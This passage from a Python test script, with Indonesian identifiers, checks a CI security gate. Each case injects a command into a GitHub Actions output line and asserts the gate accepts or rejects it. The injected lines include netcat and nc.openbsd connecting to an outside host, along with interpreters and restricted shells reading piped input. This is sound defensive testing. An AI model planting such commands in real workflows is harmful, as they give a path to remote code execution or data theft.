                    "> >(expect -D 0 -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru313 != isi_aksi313, \
            "suntikan aksi313 tidak menembak"
        with open(berkas_aksi313, "w", encoding="utf-8") as f:
            f.write(isi_baru313)
        rc, out = jalan(sub313,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect -D 0 -f -: gerbang gagal (Audit 1146)", rc != 0)
        shutil.rmtree(sub313, ignore_errors=True)
        sub314 = klon(tmp, "sub314")
        berkas_aksi314 = os.path.join(
            sub314, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi314, encoding="utf-8") as f:
            isi_aksi314 = f.read()
        baris_aksi314 = [b for b in isi_aksi314.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru314 = isi_aksi314.replace(
                baris_aksi314,
                baris_aksi314.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(expect -D 0 -f skrip.exp; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru314 != isi_aksi314, \
            "suntikan aksi314 tidak menembak"
        with open(berkas_aksi314, "w", encoding="utf-8") as f:
            f.write(isi_baru314)
        rc, out = jalan(sub314,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect -D 0 -f skrip.exp: gerbang lolos (Audit 1146)", rc == 0)
        shutil.rmtree(sub314, ignore_errors=True)
        sub315 = klon(tmp, "sub315")
        berkas_aksi315 = os.path.join(
            sub315, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi315, encoding="utf-8") as f:
            isi_aksi315 = f.read()
        baris_aksi315 = [b for b in isi_aksi315.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru315 = isi_aksi315.replace(
                baris_aksi315,
                baris_aksi315.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(diff - --label --help berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru315 != isi_aksi315, \
            "suntikan aksi315 tidak menembak"
        with open(berkas_aksi315, "w", encoding="utf-8") as f:
            f.write(isi_baru315)
        rc, out = jalan(sub315,
                        [sys.executable, GERBANG, "--semua"])
        periksa("diff - --label --help berkas: gerbang gagal (Audit 1147)", rc != 0)
        shutil.rmtree(sub315, ignore_errors=True)
        sub316 = klon(tmp, "sub316")
        berkas_aksi316 = os.path.join(
            sub316, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi316, encoding="utf-8") as f:
            isi_aksi316 = f.read()
        baris_aksi316 = [b for b in isi_aksi316.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru316 = isi_aksi316.replace(
                baris_aksi316,
                baris_aksi316.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(csplit - -f --help 2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru316 != isi_aksi316, \
            "suntikan aksi316 tidak menembak"
        with open(berkas_aksi316, "w", encoding="utf-8") as f:
            f.write(isi_baru316)
        rc, out = jalan(sub316,
                        [sys.executable, GERBANG, "--semua"])
        periksa("csplit - -f --help 2: gerbang gagal (Audit 1147)", rc != 0)
        shutil.rmtree(sub316, ignore_errors=True)
        sub317 = klon(tmp, "sub317")
        berkas_aksi317 = os.path.join(
            sub317, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi317, encoding="utf-8") as f:
            isi_aksi317 = f.read()
        baris_aksi317 = [b for b in isi_aksi317.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru317 = isi_aksi317.replace(
                baris_aksi317,
                baris_aksi317.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(diff - --help; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru317 != isi_aksi317, \
            "suntikan aksi317 tidak menembak"
        with open(berkas_aksi317, "w", encoding="utf-8") as f:
            f.write(isi_baru317)
        rc, out = jalan(sub317,
                        [sys.executable, GERBANG, "--semua"])
        periksa("diff - --help: gerbang lolos (Audit 1147)", rc == 0)
        shutil.rmtree(sub317, ignore_errors=True)
        sub318 = klon(tmp, "sub318")
        berkas_aksi318 = os.path.join(
            sub318, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi318, encoding="utf-8") as f:
            isi_aksi318 = f.read()
        baris_aksi318 = [b for b in isi_aksi318.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru318 = isi_aksi318.replace(
                baris_aksi318,
                baris_aksi318.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sha256 -hmac kunci; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru318 != isi_aksi318, \
            "suntikan aksi318 tidak menembak"
        with open(berkas_aksi318, "w", encoding="utf-8") as f:
            f.write(isi_baru318)
        rc, out = jalan(sub318,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dgst -sha256 -hmac kunci: gerbang gagal (Audit 1148)", rc != 0)
        shutil.rmtree(sub318, ignore_errors=True)
        sub319 = klon(tmp, "sub319")
        berkas_aksi319 = os.path.join(
            sub319, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi319, encoding="utf-8") as f:
            isi_aksi319 = f.read()
        baris_aksi319 = [b for b in isi_aksi319.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru319 = isi_aksi319.replace(
                baris_aksi319,
                baris_aksi319.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sha256 -sigopt rsa_padding_mode:pss; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru319 != isi_aksi319, \
            "suntikan aksi319 tidak menembak"
        with open(berkas_aksi319, "w", encoding="utf-8") as f:
            f.write(isi_baru319)
        rc, out = jalan(sub319,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dgst -sha256 -sigopt rsa_padding_mode:pss: gerbang gagal (Audit 1148)", rc != 0)
        shutil.rmtree(sub319, ignore_errors=True)
        sub320 = klon(tmp, "sub320")
        berkas_aksi320 = os.path.join(
            sub320, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi320, encoding="utf-8") as f:
            isi_aksi320 = f.read()
        baris_aksi320 = [b for b in isi_aksi320.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru320 = isi_aksi320.replace(
                baris_aksi320,
                baris_aksi320.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sha256 berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru320 != isi_aksi320, \
            "suntikan aksi320 tidak menembak"
        with open(berkas_aksi320, "w", encoding="utf-8") as f:
            f.write(isi_baru320)
        rc, out = jalan(sub320,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dgst -sha256 berkas: gerbang lolos (Audit 1148)", rc == 0)
        shutil.rmtree(sub320, ignore_errors=True)
        sub321 = klon(tmp, "sub321")
        berkas_aksi321 = os.path.join(
            sub321, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi321, encoding="utf-8") as f:
            isi_aksi321 = f.read()
        baris_aksi321 = [b for b in isi_aksi321.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru321 = isi_aksi321.replace(
                baris_aksi321,
                baris_aksi321.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl verify -verify_hostname contoh.com; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru321 != isi_aksi321, \
            "suntikan aksi321 tidak menembak"
        with open(berkas_aksi321, "w", encoding="utf-8") as f:
            f.write(isi_baru321)
        rc, out = jalan(sub321,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl verify -verify_hostname contoh.com: gerbang gagal (Audit 1149)", rc != 0)
        shutil.rmtree(sub321, ignore_errors=True)
        sub322 = klon(tmp, "sub322")
        berkas_aksi322 = os.path.join(
            sub322, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi322, encoding="utf-8") as f:
            isi_aksi322 = f.read()
        baris_aksi322 = [b for b in isi_aksi322.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru322 = isi_aksi322.replace(
                baris_aksi322,
                baris_aksi322.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl verify -CAfile ca.pem -verify_email a@b.c; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru322 != isi_aksi322, \
            "suntikan aksi322 tidak menembak"
        with open(berkas_aksi322, "w", encoding="utf-8") as f:
            f.write(isi_baru322)
        rc, out = jalan(sub322,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl verify -CAfile ca.pem -verify_email a@b.c: gerbang gagal (Audit 1149)", rc != 0)
        shutil.rmtree(sub322, ignore_errors=True)
        sub323 = klon(tmp, "sub323")
        berkas_aksi323 = os.path.join(
            sub323, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi323, encoding="utf-8") as f:
            isi_aksi323 = f.read()
        baris_aksi323 = [b for b in isi_aksi323.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru323 = isi_aksi323.replace(
                baris_aksi323,
                baris_aksi323.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl verify -verify_hostname contoh.com sert.pem; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru323 != isi_aksi323, \
            "suntikan aksi323 tidak menembak"
        with open(berkas_aksi323, "w", encoding="utf-8") as f:
            f.write(isi_baru323)
        rc, out = jalan(sub323,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl verify -verify_hostname contoh.com sert.pem: gerbang lolos (Audit 1149)", rc == 0)
        shutil.rmtree(sub323, ignore_errors=True)
        sub324 = klon(tmp, "sub324")
        berkas_aksi324 = os.path.join(
            sub324, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi324, encoding="utf-8") as f:
            isi_aksi324 = f.read()
        baris_aksi324 = [b for b in isi_aksi324.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru324 = isi_aksi324.replace(
                baris_aksi324,
                baris_aksi324.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --verify - data.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru324 != isi_aksi324, \
            "suntikan aksi324 tidak menembak"
        with open(berkas_aksi324, "w", encoding="utf-8") as f:
            f.write(isi_baru324)
        rc, out = jalan(sub324,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg --verify - data.txt: gerbang gagal (Audit 1150)", rc != 0)
        shutil.rmtree(sub324, ignore_errors=True)
        sub325 = klon(tmp, "sub325")
        berkas_aksi325 = os.path.join(
            sub325, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi325, encoding="utf-8") as f:
            isi_aksi325 = f.read()
        baris_aksi325 = [b for b in isi_aksi325.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru325 = isi_aksi325.replace(
                baris_aksi325,
                baris_aksi325.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --verify sig.asc data.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru325 != isi_aksi325, \
            "suntikan aksi325 tidak menembak"
        with open(berkas_aksi325, "w", encoding="utf-8") as f:
            f.write(isi_baru325)
        rc, out = jalan(sub325,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg --verify sig.asc data.txt: gerbang lolos (Audit 1150)", rc == 0)
        shutil.rmtree(sub325, ignore_errors=True)
        sub326 = klon(tmp, "sub326")
        berkas_aksi326 = os.path.join(
            sub326, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi326, encoding="utf-8") as f:
            isi_aksi326 = f.read()
        baris_aksi326 = [b for b in isi_aksi326.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru326 = isi_aksi326.replace(
                baris_aksi326,
                baris_aksi326.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -t -T daftar.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru326 != isi_aksi326, \
            "suntikan aksi326 tidak menembak"
        with open(berkas_aksi326, "w", encoding="utf-8") as f:
            f.write(isi_baru326)
        rc, out = jalan(sub326,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -t -T daftar.txt: gerbang gagal (Audit 1151)", rc != 0)
        shutil.rmtree(sub326, ignore_errors=True)
        sub327 = klon(tmp, "sub327")
        berkas_aksi327 = os.path.join(
            sub327, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi327, encoding="utf-8") as f:
            isi_aksi327 = f.read()
        baris_aksi327 = [b for b in isi_aksi327.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru327 = isi_aksi327.replace(
                baris_aksi327,
                baris_aksi327.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -x -T daftar.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru327 != isi_aksi327, \
            "suntikan aksi327 tidak menembak"
        with open(berkas_aksi327, "w", encoding="utf-8") as f:
            f.write(isi_baru327)
        rc, out = jalan(sub327,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -x -T daftar.txt: gerbang gagal (Audit 1151)", rc != 0)
        shutil.rmtree(sub327, ignore_errors=True)
        sub328 = klon(tmp, "sub328")
        berkas_aksi328 = os.path.join(
            sub328, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi328, encoding="utf-8") as f:
            isi_aksi328 = f.read()
        baris_aksi328 = [b for b in isi_aksi328.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru328 = isi_aksi328.replace(
                baris_aksi328,
                baris_aksi328.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -t -f arsip.tar -T daftar.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru328 != isi_aksi328, \
            "suntikan aksi328 tidak menembak"
        with open(berkas_aksi328, "w", encoding="utf-8") as f:
            f.write(isi_baru328)
        rc, out = jalan(sub328,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -t -f arsip.tar -T daftar.txt: gerbang lolos (Audit 1151)", rc == 0)
        shutil.rmtree(sub328, ignore_errors=True)
        sub329 = klon(tmp, "sub329")
        berkas_aksi329 = os.path.join(
            sub329, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi329, encoding="utf-8") as f:
            isi_aksi329 = f.read()
        baris_aksi329 = [b for b in isi_aksi329.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru329 = isi_aksi329.replace(
                baris_aksi329,
                baris_aksi329.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -t -f; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru329 != isi_aksi329, \
            "suntikan aksi329 tidak menembak"
        with open(berkas_aksi329, "w", encoding="utf-8") as f:
            f.write(isi_baru329)
        rc, out = jalan(sub329,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -t -f: gerbang lolos (Audit 1152)", rc == 0)
        shutil.rmtree(sub329, ignore_errors=True)
        sub330 = klon(tmp, "sub330")
        berkas_aksi330 = os.path.join(
            sub330, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi330, encoding="utf-8") as f:
            isi_aksi330 = f.read()
        baris_aksi330 = [b for b in isi_aksi330.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru330 = isi_aksi330.replace(
                baris_aksi330,
                baris_aksi330.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -tf; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru330 != isi_aksi330, \
            "suntikan aksi330 tidak menembak"
        with open(berkas_aksi330, "w", encoding="utf-8") as f:
            f.write(isi_baru330)
        rc, out = jalan(sub330,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -tf: gerbang lolos (Audit 1152)", rc == 0)
        shutil.rmtree(sub330, ignore_errors=True)
        sub331 = klon(tmp, "sub331")
        berkas_aksi331 = os.path.join(
            sub331, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi331, encoding="utf-8") as f:
            isi_aksi331 = f.read()
        baris_aksi331 = [b for b in isi_aksi331.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru331 = isi_aksi331.replace(
                baris_aksi331,
                baris_aksi331.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unshare --propagation private; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru331 != isi_aksi331, \
            "suntikan aksi331 tidak menembak"
        with open(berkas_aksi331, "w", encoding="utf-8") as f:
            f.write(isi_baru331)
        rc, out = jalan(sub331,
                        [sys.executable, GERBANG, "--semua"])
        periksa("unshare --propagation private: gerbang gagal (Audit 1153)", rc != 0)
        shutil.rmtree(sub331, ignore_errors=True)
        sub332 = klon(tmp, "sub332")
        berkas_aksi332 = os.path.join(
            sub332, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi332, encoding="utf-8") as f:
            isi_aksi332 = f.read()
        baris_aksi332 = [b for b in isi_aksi332.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru332 = isi_aksi332.replace(
                baris_aksi332,
                baris_aksi332.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(unshare --propagation private sort berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru332 != isi_aksi332, \
            "suntikan aksi332 tidak menembak"
        with open(berkas_aksi332, "w", encoding="utf-8") as f:
            f.write(isi_baru332)
        rc, out = jalan(sub332,
                        [sys.executable, GERBANG, "--semua"])
        periksa("unshare --propagation private sort berkas: gerbang lolos (Audit 1153)", rc == 0)
        shutil.rmtree(sub332, ignore_errors=True)
        sub333 = klon(tmp, "sub333")
        berkas_aksi333 = os.path.join(
            sub333, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi333, encoding="utf-8") as f:
            isi_aksi333 = f.read()
        baris_aksi333 = [b for b in isi_aksi333.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru333 = isi_aksi333.replace(
                baris_aksi333,
                baris_aksi333.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(diff - berkas ''<pengganti.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru333 != isi_aksi333, \
            "suntikan aksi333 tidak menembak"
        with open(berkas_aksi333, "w", encoding="utf-8") as f:
            f.write(isi_baru333)
        rc, out = jalan(sub333,
                        [sys.executable, GERBANG, "--semua"])
        periksa("diff - berkas ''<pengganti.txt: gerbang lolos (Audit 1154)", rc == 0)
        shutil.rmtree(sub333, ignore_errors=True)
        sub334 = klon(tmp, "sub334")
        berkas_aksi334 = os.path.join(
            sub334, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi334, encoding="utf-8") as f:
            isi_aksi334 = f.read()
        baris_aksi334 = [b for b in isi_aksi334.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru334 = isi_aksi334.replace(
                baris_aksi334,
                baris_aksi334.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(setpriv --reuid=1000 --regid=1000 --clear-groups cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru334 != isi_aksi334, \
            "suntikan aksi334 tidak menembak"
        with open(berkas_aksi334, "w", encoding="utf-8") as f:
            f.write(isi_baru334)
        rc, out = jalan(sub334,
                        [sys.executable, GERBANG, "--semua"])
        periksa("setpriv --reuid=1000 --regid=1000 --clear-groups cat: gerbang gagal (Audit 1155)", rc != 0)
        shutil.rmtree(sub334, ignore_errors=True)
        sub335 = klon(tmp, "sub335")
        berkas_aksi335 = os.path.join(
            sub335, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi335, encoding="utf-8") as f:
            isi_aksi335 = f.read()
        baris_aksi335 = [b for b in isi_aksi335.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru335 = isi_aksi335.replace(
                baris_aksi335,
                baris_aksi335.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(setpriv --reuid=1000 sort berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru335 != isi_aksi335, \
            "suntikan aksi335 tidak menembak"
        with open(berkas_aksi335, "w", encoding="utf-8") as f:
            f.write(isi_baru335)
        rc, out = jalan(sub335,
                        [sys.executable, GERBANG, "--semua"])
        periksa("setpriv --reuid=1000 sort berkas: gerbang lolos (Audit 1155)", rc == 0)
        shutil.rmtree(sub335, ignore_errors=True)
        sub336 = klon(tmp, "sub336")
        berkas_aksi336 = os.path.join(
            sub336, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi336, encoding="utf-8") as f:
            isi_aksi336 = f.read()
        baris_aksi336 = [b for b in isi_aksi336.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru336 = isi_aksi336.replace(
                baris_aksi336,
                baris_aksi336.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(prlimit --nproc=100 cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru336 != isi_aksi336, \
            "suntikan aksi336 tidak menembak"
        with open(berkas_aksi336, "w", encoding="utf-8") as f:
            f.write(isi_baru336)
        rc, out = jalan(sub336,
                        [sys.executable, GERBANG, "--semua"])
        periksa("prlimit --nproc=100 cat: gerbang gagal (Audit 1156)", rc != 0)
        shutil.rmtree(sub336, ignore_errors=True)
        sub337 = klon(tmp, "sub337")
        berkas_aksi337 = os.path.join(
            sub337, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi337, encoding="utf-8") as f:
            isi_aksi337 = f.read()
        baris_aksi337 = [b for b in isi_aksi337.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru337 = isi_aksi337.replace(
                baris_aksi337,
                baris_aksi337.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(prlimit --pid 123; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru337 != isi_aksi337, \
            "suntikan aksi337 tidak menembak"
        with open(berkas_aksi337, "w", encoding="utf-8") as f:
            f.write(isi_baru337)
        rc, out = jalan(sub337,
                        [sys.executable, GERBANG, "--semua"])
        periksa("prlimit --pid 123: gerbang lolos (Audit 1156)", rc == 0)
        shutil.rmtree(sub337, ignore_errors=True)
        sub338 = klon(tmp, "sub338")
        berkas_aksi338 = os.path.join(
            sub338, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi338, encoding="utf-8") as f:
            isi_aksi338 = f.read()
        baris_aksi338 = [b for b in isi_aksi338.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru338 = isi_aksi338.replace(
                baris_aksi338,
                baris_aksi338.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(netcat contoh.com 80; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru338 != isi_aksi338, \
            "suntikan aksi338 tidak menembak"
        with open(berkas_aksi338, "w", encoding="utf-8") as f:
            f.write(isi_baru338)
        rc, out = jalan(sub338,
                        [sys.executable, GERBANG, "--semua"])
        periksa("netcat contoh.com 80: gerbang gagal (Audit 1157)", rc != 0)
        shutil.rmtree(sub338, ignore_errors=True)
        sub339 = klon(tmp, "sub339")
        berkas_aksi339 = os.path.join(
            sub339, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi339, encoding="utf-8") as f:
            isi_aksi339 = f.read()
        baris_aksi339 = [b for b in isi_aksi339.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru339 = isi_aksi339.replace(
                baris_aksi339,
                baris_aksi339.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nc.openbsd contoh.com 80; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru339 != isi_aksi339, \
            "suntikan aksi339 tidak menembak"
        with open(berkas_aksi339, "w", encoding="utf-8") as f:
            f.write(isi_baru339)
        rc, out = jalan(sub339,
                        [sys.executable, GERBANG, "--semua"])
        periksa("nc.openbsd contoh.com 80: gerbang gagal (Audit 1157)", rc != 0)
        shutil.rmtree(sub339, ignore_errors=True)
        sub340 = klon(tmp, "sub340")
        berkas_aksi340 = os.path.join(
            sub340, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi340, encoding="utf-8") as f:
            isi_aksi340 = f.read()
        baris_aksi340 = [b for b in isi_aksi340.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru340 = isi_aksi340.replace(
                baris_aksi340,
                baris_aksi340.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(rbash; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru340 != isi_aksi340, \
            "suntikan aksi340 tidak menembak"
        with open(berkas_aksi340, "w", encoding="utf-8") as f:
            f.write(isi_baru340)
        rc, out = jalan(sub340,
                        [sys.executable, GERBANG, "--semua"])
        periksa("rbash: gerbang gagal (Audit 1158)", rc != 0)
        shutil.rmtree(sub340, ignore_errors=True)
        sub341 = klon(tmp, "sub341")
        berkas_aksi341 = os.path.join(
            sub341, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi341, encoding="utf-8") as f:
            isi_aksi341 = f.read()
        baris_aksi341 = [b for b in isi_aksi341.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru341 = isi_aksi341.replace(
                baris_aksi341,
                baris_aksi341.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(rzsh; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru341 != isi_aksi341, \
            "suntikan aksi341 tidak menembak"
        with open(berkas_aksi341, "w", encoding="utf-8") as f:
            f.write(isi_baru341)
        rc, out = jalan(sub341,
                        [sys.executable, GERBANG, "--semua"])
        periksa("rzsh: gerbang gagal (Audit 1158)", rc != 0)
        shutil.rmtree(sub341, ignore_errors=True)
        sub342 = klon(tmp, "sub342")
        berkas_aksi342 = os.path.join(
            sub342, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi342, encoding="utf-8") as f:
            isi_aksi342 = f.read()
        baris_aksi342 = [b for b in isi_aksi342.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru342 = isi_aksi342.replace(
                baris_aksi342,
                baris_aksi342.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(python3.12; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru342 != isi_aksi342, \
            "suntikan aksi342 tidak menembak"
        with open(berkas_aksi342, "w", encoding="utf-8") as f:
            f.write(isi_baru342)
        rc, out = jalan(sub342,
                        [sys.executable, GERBANG, "--semua"])
        periksa("python3.12: gerbang gagal (Audit 1159)", rc != 0)
        shutil.rmtree(sub342, ignore_errors=True)
        sub343 = klon(tmp, "sub343")
        berkas_aksi343 = os.path.join(
            sub343, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi343, encoding="utf-8") as f:
            isi_aksi343 = f.read()
        baris_aksi343 = [b for b in isi_aksi343.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru343 = isi_aksi343.replace(
                baris_aksi343,
                baris_aksi343.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tclsh8.6; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru343 != isi_aksi343, \
            "suntikan aksi343 tidak menembak"
        with open(berkas_aksi343, "w", encoding="utf-8") as f:
            f.write(isi_baru343)
        rc, out = jalan(sub343,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tclsh8.6: gerbang gagal (Audit 1159)", rc != 0)
        shutil.rmtree(sub343, ignore_errors=True)
        sub344 = klon(tmp, "sub344")
        berkas_aksi344 = os.path.join(
            sub344, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi344, encoding="utf-8") as f:
            isi_aksi344 = f.read()
        baris_aksi344 = [b for b in isi_aksi344.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru344 = isi_aksi344.replace(
                baris_aksi344,
                baris_aksi344.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tclsh8.6 skrip.tcl; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru344 != isi_aksi344, \
            "suntikan aksi344 tidak menembak"
        with open(berkas_aksi344, "w", encoding="utf-8") as f:
            f.write(isi_baru344)
        rc, out = jalan(sub344,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tclsh8.6 skrip.tcl: gerbang lolos (Audit 1159)", rc == 0)
        shutil.rmtree(sub344, ignore_errors=True)
        sub345 = klon(tmp, "sub345")
        berkas_aksi345 = os.path.join(
            sub345, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi345, encoding="utf-8") as f:
            isi_aksi345 = f.read()
        baris_aksi345 = [b for b in isi_aksi345.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru345 = isi_aksi345.replace(
                baris_aksi345,
                baris_aksi345.replace(
